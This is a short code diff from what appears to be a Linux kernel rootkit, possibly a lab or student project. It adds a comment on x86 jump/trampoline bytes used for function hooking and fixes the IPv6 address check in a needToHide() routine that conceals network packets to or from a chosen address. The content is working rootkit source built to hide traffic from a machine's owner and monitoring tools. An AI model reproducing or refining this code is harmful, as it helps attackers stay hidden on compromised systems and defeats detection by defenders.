@@ -11,7 +11,7 @@
 
 
 //	ff 25 00 00 00 00       jmpq   *0x200b32(%rip) for jump? Not working....
-
+// e9 oder e8 relative adresse
 // x86 assembler for:
 // push $0x00000000 ; address to be adjusted
 // ret
@@ -94,7 +94,7 @@ bool needToHide(struct sk_buff* buff)
 	else {
 		if(buff->protocol == ntohs(34525)) { // IPv6
 			struct ipv6hdr* i6hdr = (struct ipv6hdr*) skb_network_header(buff);
-			if(ipv6_addr_cmp(&hideThisIP6, &i6hdr->saddr) || ipv6_addr_cmp(&hideThisIP6, &i6hdr->daddr)) {
+			if(ipv6_addr_cmp(&hideThisIP6, &i6hdr->saddr) == 0 || ipv6_addr_cmp(&hideThisIP6, &i6hdr->daddr) == 0) {
 				//printk("found IPv6 \n");
 				//printk("IPv6: %pI6 -> %pI6 \n", i6hdr->saddr, i6hdr->daddr);
 				return true;
